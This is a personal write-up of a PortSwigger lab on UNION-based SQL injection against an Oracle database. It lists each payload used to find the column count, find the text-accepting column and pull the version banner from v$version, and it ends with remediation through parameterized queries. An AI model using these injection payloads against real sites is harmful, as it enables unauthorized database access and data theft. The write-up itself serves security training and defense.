# SQL Injection Attack - Querying Database Version on Oracle

**Platform:** PortSwigger Web Security Academy  
**Lab URL:** https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle  
**Difficulty:** Practitioner  
**Date Completed:** March 13, 2025  
**Status:** ✅ Solved  

---

## 📋 Lab Description

**Objective:**  
This lab contains a SQL injection vulnerability in the product category filter. The goal is to display the database version string by exploiting this vulnerability. The database is Oracle, which requires specific syntax considerations.

**Target:**  
Make the database retrieve and display the Oracle version string containing information about Oracle Database 11g Express Edition.

**Learning Goals:**
- Understand UNION-based SQL injection
- Learn Oracle-specific SQL syntax (`FROM dual`, `v$version`)
- Practice determining column count and data types
- Extract sensitive database information

---

## 🔍 Reconnaissance

### Initial Observations

**Application:** E-commerce product catalog website

**Vulnerable Parameter:**  
`category` parameter in URL: `?category=Gifts`

**Suspected Vulnerable Query:**
```sql
SELECT product_name, description FROM products WHERE category = 'USER_INPUT'
```

### Oracle Database Specifics

**Key Oracle Requirements:**
1. Every SELECT statement must have a FROM clause
2. Oracle provides `dual` - a dummy table for testing
3. System view `v$version` contains database version information
4. The `banner` column in `v$version` holds version strings

**Oracle vs Standard SQL:**
```sql
-- Standard SQL (MySQL, PostgreSQL)
SELECT NULL, NULL

-- Oracle SQL (REQUIRED)
SELECT NULL, NULL FROM dual
```

---

## 💉 Exploitation Process

### Phase 1: Confirm SQL Injection Vulnerability

**Test Payload:**
```
category=Gifts'
```

**Expected Result:**  
Error message or unusual behavior indicates vulnerability.

---

### Phase 2: Determine Number of Columns

**Strategy:**  
Use UNION with NULL values and Oracle's `dual` table to find column count.

**Attempt 1 - Test for 1 column:**
```
category=Gifts'+UNION+SELECT+NULL+FROM+dual--
```

**Result:** ❌ Error (internal server error or type mismatch)

**Conclusion:** Query returns more than 1 column

---

**Attempt 2 - Test for 2 columns:**
```
category=Gifts'+UNION+SELECT+NULL,NULL+FROM+dual--
```

**Result:** ✅ Page loads successfully, no error

**Conclusion:** The original query returns exactly **2 columns**

---

**Why this works:**

**Original query structure:**
```sql
SELECT column1, column2 FROM products WHERE category = 'Gifts'
```

**After injection:**
```sql
SELECT column1, column2 FROM products WHERE category = 'Gifts' 
UNION 
SELECT NULL, NULL FROM dual--'
```

**The `--` comments out the trailing single quote, preventing syntax error.**

---

### Phase 3: Identify Text-Compatible Column

**UNION requirements:**
- Column count must match ✓ (2 columns confirmed)
- Data types must be compatible

**Test Column 1:**
```
category=Gifts'+UNION+SELECT+'abc',NULL+FROM+dual--
```

**Result:** ❌ Error (data type mismatch)

**Conclusion:** Column 1 does not accept string data

---

**Test Column 2:**
```
category=Gifts'+UNION+SELECT+NULL,'abc'+FROM+dual--
```

**Result:** ✅ Success! The string 'abc' appears on the page

**Conclusion:** Column 2 accepts text/string data

---

### Phase 4: Extract Oracle Database Version

**Now we know:**
- Query has 2 columns ✓
- Column 2 accepts text ✓
- Database is Oracle ✓

**Final Payload:**
```
category=Gifts'+UNION+SELECT+NULL,banner+FROM+v$version--
```

**Full URL:**
```
https://[lab-id].web-security-academy.net/filter?category=Gifts'+UNION+SELECT+NULL,banner+FROM+v$version--
```

---

**Resulting SQL Query:**
```sql
SELECT product_name, description 
FROM products 
WHERE category = 'Gifts' 
UNION 
SELECT NULL, banner 
FROM v$version--'
```

**The query executes as:**
1. First SELECT: Returns normal products from 'Gifts' category
2. UNION: Combines results
3. Second SELECT: Returns Oracle version information from `v$version`
4. Comment `--`: Ignores the trailing quote

---

## ✅ Success Result

**Database version strings displayed on the page:**

```
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
PL/SQL Release 11.2.0.2.0 - Production
CORE 11.2.0.2.0 Production
TNS for Linux: Version 11.2.0.2.0 - Production
NLSRTL Version 11.2.0.2.0 - Production
```

**Lab Status:**  
✅ **"Congratulations, you solved the lab!"**

---

## 🧠 Technical Deep Dive

### Understanding UNION-Based SQL Injection

**What is UNION?**

UNION is a SQL operator that combines results from multiple SELECT statements.

**Example:**

**Query 1 (Products):**
```sql
SELECT product_name, price FROM products WHERE category = 'Gifts'
```
Returns:
```
Teddy Bear | $10
Coffee Mug | $5
```

**Query 2 (Users):**
```sql
SELECT username, password FROM users
```
Returns:
```
admin | secret123
john  | pass456
```

**Combined with UNION:**
```sql
SELECT product_name, price FROM products WHERE category = 'Gifts'
UNION
SELECT username, password FROM users
```

**Final Result (displayed to user):**
```
Teddy Bear | $10
Coffee Mug | $5
admin      | secret123  ← Sensitive data leaked!
john       | pass456    ← Sensitive data leaked!
```

**This is how attackers extract data from other tables!**

---

### UNION Requirements

**For UNION to work:**

1. **Same number of columns:**
   - Both SELECT statements must return the same number of columns
   - Original query: 2 columns → UNION query: must also have 2 columns

2. **Compatible data types:**
   - Corresponding columns must have compatible types
   - Use NULL as a universal compatible value

**Example of column matching:**

```sql
-- Original query (2 columns: text, text)
SELECT product_name, description FROM products

-- UNION query must match (2 columns)
UNION SELECT NULL, banner FROM v$version
     -- Column 1: NULL (matches any type)
     -- Column 2: banner (text, matches description)
```

---

### Oracle-Specific Syntax

#### FROM dual

**In Oracle, every SELECT must have a FROM clause.**

**Other databases:**
```sql
SELECT 1, 2;  -- Valid in MySQL, PostgreSQL
```

**Oracle:**
```sql
SELECT 1, 2;           -- ❌ ERROR: FROM keyword not found
SELECT 1, 2 FROM dual; -- ✅ WORKS
```

**What is `dual`?**
- A special one-row, one-column table
- Created automatically in every Oracle database
- Used when you need a FROM clause but no real table

**Structure of `dual`:**
```sql
SELECT * FROM dual;
```
Returns:
```
DUMMY
------
X
```

Just one row with one column containing 'X'.

---

#### v$version System View

**Oracle provides system views for metadata.**

**v$version contains:**
- `banner` column: Database version information
- Multiple rows for different components

**Query v$version:**
```sql
SELECT banner FROM v$version;
```

**Returns:**
```
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
PL/SQL Release 11.2.0.2.0 - Production
CORE 11.2.0.2.0 Production
TNS for Linux: Version 11.2.0.2.0 - Production
NLSRTL Version 11.2.0.2.0 - Production
```

**Other useful Oracle system views:**
- `v$database` - Database information
- `all_tables` - All accessible tables
- `user_tables` - Tables owned by current user
- `all_tab_columns` - Column information
- `all_users` - All database users

---

### Why Comments Matter

**The `--` comment is critical for successful injection.**

**Without comment:**
```sql
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL, banner FROM v$version' AND some_condition
                                                                                        ↑
                                                                     Syntax error! Unexpected quote
```

**With comment:**
```sql
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL, banner FROM v$version--' AND some_condition
                                                                                          ↑↑
                                                                Everything after -- is ignored
```

**SQL comment syntax varies by database:**
- `--` (double dash) - Oracle, MySQL, PostgreSQL, SQL Server
- `#` (hash) - MySQL only
- `/* ... */` (block comment) - All databases

---

## 🚨 Impact Assessment

**Severity:** High

### Business Impact

**Information Disclosure:**
- Database type and version exposed
- Component versions revealed
- Platform architecture disclosed (64-bit)

**Security Implications:**
- Known vulnerabilities for Oracle 11g can be exploited
- Attack surface expanded with version knowledge
- Foundation for further exploitation

### Technical Impact

**What attackers can do with this information:**

1. **Identify Known Vulnerabilities:**
   - Oracle 11g Express Edition has documented CVEs
   - Specific version numbers help find exact exploits
   - PL/SQL version reveals available features

2. **Database Fingerprinting:**
   - Confirms Oracle database (not MySQL, PostgreSQL, etc.)
   - Reveals Express Edition (limited features vs Enterprise)
   - Operating system identified (Linux)

3. **Attack Planning:**
   - Tailor SQL injection payloads for Oracle syntax
   - Use Oracle-specific functions and tables
   - Plan privilege escalation attacks

4. **Further Data Extraction:**
   - Extract table names from `all_tables`
   - Enumerate users from `all_users`
   - Retrieve sensitive data from application tables
   - Access stored procedures and functions

**Attack Complexity:** Low  
**Privileges Required:** None (unauthenticated)  
**User Interaction:** None  

---

## 🛡️ Remediation

### Primary Defense: Parameterized Queries

**Vulnerable Code (String Concatenation):**

**Python (Vulnerable):**
```python
category = request.GET['category']
query = f"SELECT * FROM products WHERE category = '{category}'"
cursor.execute(query)  # DANGEROUS - Direct string interpolation
```

**Secure Code (Parameterized Queries):**

**Python (cx_Oracle - Secure):**
```python
category = request.GET['category']
query = "SELECT * FROM products WHERE category = :category"
cursor.execute(query, {'category': category})  # SAFE - Parameterized
```

**Why parameterized queries work:**
- Database treats user input as DATA, never as CODE
- Injection payload `'+UNION+SELECT...` becomes literal search text
- No SQL execution of user input possible

---

**Other Languages:**

**Java (JDBC - Secure):**
```java
String category = request.getParameter("category");
String query = "SELECT * FROM products WHERE category = ?";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setString(1, category);  // Parameter binding
ResultSet rs = stmt.executeQuery();
```

**PHP (PDO - Secure):**
```php
$category = $_GET['category'];
$stmt = $pdo->prepare("SELECT * FROM products WHERE category = :category");
$stmt->execute(['category' => $category]);
```

**C# / .NET (Secure):**
```csharp
string category = Request.QueryString["category"];
string query = "SELECT * FROM products WHERE category = :category";
OracleCommand cmd = new OracleCommand(query, connection);
cmd.Parameters.Add(new OracleParameter("category", category));
OracleDataReader reader = cmd.ExecuteReader();
```

**Node.js (oracledb - Secure):**
```javascript
const category = req.query.category;
const result = await connection.execute(
  "SELECT * FROM products WHERE category = :category",
  { category: category }  // Bind variable
);
```

---

### Defense in Depth

**Layer 1: Secure Coding**
- ✅ Use parameterized queries (prepared statements)
- ✅ Use ORM frameworks with built-in protection
- ✅ Never concatenate user input into SQL

**Layer 2: Input Validation**
- Whitelist allowed characters
- Validate data types (e.g., category should be alphanumeric)
- Reject SQL special characters if not needed: `' " ; -- /* */`
- Maximum length restrictions

**Layer 3: Least Privilege**
- Application database user should have minimal permissions
- Read-only access where possible
- No access to system views like `v$version`
- Restrict access to sensitive tables

**Layer 4: Error Handling**
- Don't expose detailed error messages to users
- Log errors server-side for debugging
- Generic error messages: "An error occurred" not "SQL syntax error..."

**Layer 5: Web Application Firewall (WAF)**
- Detect and block common SQL injection patterns
- Rate limiting for suspicious requests
- NOT a replacement for secure coding!

**Layer 6: Monitoring & Detection**
- Log all database queries
- Alert on suspicious patterns (UNION, v$version, etc.)
- Monitor for unusual data access
- Implement intrusion detection systems (IDS)

---

## 📚 Lessons Learned

### Key Concepts Mastered

1. **UNION-Based SQL Injection:**
   - UNION combines results from multiple queries
   - Must match column count exactly
   - Must use compatible data types
   - NULL is universally compatible

2. **Oracle-Specific Syntax:**
   - `FROM dual` required for testing
   - `v$version` contains database version
   - Different from MySQL, PostgreSQL syntax
   - Oracle uses `:` for bind variables (in secure code)

3. **Methodology for UNION Attacks:**
   - Step 1: Confirm vulnerability (error-based detection)
   - Step 2: Determine column count (incremental NULL testing)
   - Step 3: Identify text-compatible columns (string testing)
   - Step 4: Extract desired data (system views, tables)

4. **Information Gathering:**
   - Database version reveals attack opportunities
   - System views contain valuable metadata
   - Enumeration is the foundation for deeper attacks

5. **Defense Priority:**
   - Parameterized queries are non-negotiable
   - Input validation is secondary defense
   - Multiple layers provide resilience

---

### Real-World Applications

**This technique applies to:**
- Any web application using Oracle database
- E-commerce sites (product catalogs)
- Content management systems
- Enterprise applications
- Government systems

**Real breach examples:**
- Many major breaches start with SQL injection
- Version enumeration helps attackers plan targeted attacks
- Often combined with other vulnerabilities

**Bug bounty value:**
- SQL injection: $500 - $5,000+ depending on severity
- Information disclosure: $200 - $1,000+
- Combined: Higher payouts for complete exploit chains

---

## 🔗 References

### OWASP Resources
- **OWASP Top 10 2021:** A03:2021 – Injection
- **OWASP SQL Injection:** https://owasp.org/www-community/attacks/SQL_Injection
- **OWASP Testing Guide:** SQL Injection Testing

### CWE Classifications
- **CWE-89:** Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
- **CWE-209:** Generation of Error Message Containing Sensitive Information

### Database Documentation
- **Oracle SQL Reference:** UNION Operator
- **Oracle Database Security Guide**
- **Oracle v$ Views Documentation**

### Additional Learning
- **PortSwigger SQL Injection Cheat Sheet:** https://portswigger.net/web-security/sql-injection/cheat-sheet
- **OWASP SQL Injection Prevention Cheat Sheet**
- **HackerOne Disclosed Reports:** Search for "SQL Injection Oracle"

---

## 🎯 Exploitation Summary

**Attack Vector:** SQL Injection via `category` parameter

**Payload Progression:**

| Step | Payload | Purpose | Result |
|------|---------|---------|--------|
| 1 | `Gifts'` | Confirm vulnerability | Error / unusual behavior |
| 2 | `Gifts'+UNION+SELECT+NULL+FROM+dual--` | Test 1 column | ❌ Error |
| 3 | `Gifts'+UNION+SELECT+NULL,NULL+FROM+dual--` | Test 2 columns | ✅ Success |
| 4 | `Gifts'+UNION+SELECT+'abc',NULL+FROM+dual--` | Test column 1 type | ❌ Error |
| 5 | `Gifts'+UNION+SELECT+NULL,'abc'+FROM+dual--` | Test column 2 type | ✅ 'abc' displayed |
| 6 | `Gifts'+UNION+SELECT+NULL,banner+FROM+v$version--` | Extract version | ✅ Version strings shown |

**Time to Exploit:** ~10 minutes (with methodology)

**Skill Level Required:** Intermediate (requires understanding of UNION and Oracle syntax)

---

## ✅ Completion Checklist

- [x] Identified vulnerable parameter (category)
- [x] Confirmed SQL injection vulnerability
- [x] Determined query returns 2 columns
- [x] Identified column 2 accepts text data
- [x] Successfully extracted Oracle database version
- [x] Understood Oracle-specific syntax requirements
- [x] Documented complete attack methodology
- [x] Researched and documented proper remediation
- [x] Completed comprehensive writeup with technical details

---

## 🏷️ Tags

`sql-injection` `union-attack` `oracle-database` `information-disclosure` `portswigger` `web-security` `owasp-a03` `database-enumeration` `practitioner`

---

## 💭 Personal Notes

**What I learned:**
- Oracle requires `FROM dual` for every SELECT (different from MySQL)
- UNION attacks need exact column count matching
- NULL is a versatile tool for type compatibility
- System views like `v$version` are goldmines for attackers
- Parameterized queries are the ONLY reliable defense

**Challenges faced:**
- Understanding Oracle-specific syntax differences
- Remembering to use `FROM dual` for testing
- Determining which column accepts text data

**Skills gained:**
- UNION-based SQL injection techniques
- Oracle database enumeration
- Systematic approach to determining query structure
- Technical documentation and writeup creation

**Next steps:**
- Practice UNION attacks on MySQL and PostgreSQL
- Learn blind SQL injection techniques
- Study advanced data extraction methods
- Practice on real-world bug bounty targets (with permission)

---

*This writeup documents authorized security testing on PortSwigger Web Security Academy for educational purposes. Never perform security testing on systems without explicit permission.*

**Lab Completed:** March 13, 2025  
**Time Spent:** ~1 hour (including research and documentation)  
**Difficulty Rating:** 4/5 (Practitioner level, requires UNION knowledge)
